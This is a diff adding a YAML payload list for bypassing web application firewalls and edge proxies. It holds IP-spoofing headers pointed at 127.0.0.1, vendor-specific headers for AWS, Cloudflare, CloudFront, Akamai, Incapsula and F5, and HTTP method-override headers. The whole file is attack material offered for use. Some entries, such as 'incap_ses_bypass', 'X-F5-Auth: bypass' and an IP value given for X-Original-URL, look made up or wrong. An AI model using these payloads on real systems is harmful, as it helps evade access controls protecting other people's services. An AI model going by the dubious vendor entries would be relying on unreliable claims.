@@ -1,0 +1,40 @@
+# payloads/waf_bypass.yml
+# Comprehensive HTTP header and path mutations for edge proxy bypass
+
+spoof_headers:
+  - {"X-Originating-IP": "127.0.0.1"}
+  - {"X-Forwarded-For": "127.0.0.1"}
+  - {"X-Forwarded": "127.0.0.1"}
+  - {"Forwarded-For": "127.0.0.1"}
+  - {"X-Remote-IP": "127.0.0.1"}
+  - {"X-Remote-Addr": "127.0.0.1"}
+  - {"X-ProxyUser-Ip": "127.0.0.1"}
+  - {"X-Original-URL": "127.0.0.1"}
+  - {"Client-IP": "127.0.0.1"}
+  - {"True-Client-IP": "127.0.0.1"}
+  - {"Cluster-Client-IP": "127.0.0.1"}
+  - {"X-Custom-IP-Authorization": "127.0.0.1"}
+
+vendor_specific:
+  aws_api_gateway:
+    - {"X-Amz-Date": "20260308T000000Z"}
+    - {"X-Amz-Security-Token": ""}
+  cloudflare:
+    - {"CF-Connecting-IP": "127.0.0.1"}
+    - {"CF-IPCountry": "US"}
+    - {"CF-Visitor": '{"scheme":"https"}'}
+  cloudfront:
+    - {"CloudFront-Viewer-Country": "US"}
+    - {"CloudFront-Is-Desktop-Viewer": "true"}
+    - {"CloudFront-Forwarded-Proto": "https"}
+  akamai:
+    - {"Pragma": "akamai-x-get-true-cache-key"}
+  incapsula:
+    - {"incap_ses_bypass": "1"}
+  f5_bigip:
+    - {"X-F5-Auth": "bypass"}
+
+verb_tampering:
+  - {"X-HTTP-Method-Override": "PUT"}
+  - {"X-HTTP-Method": "PATCH"}
+  - {"X-Method-Override": "DELETE"}
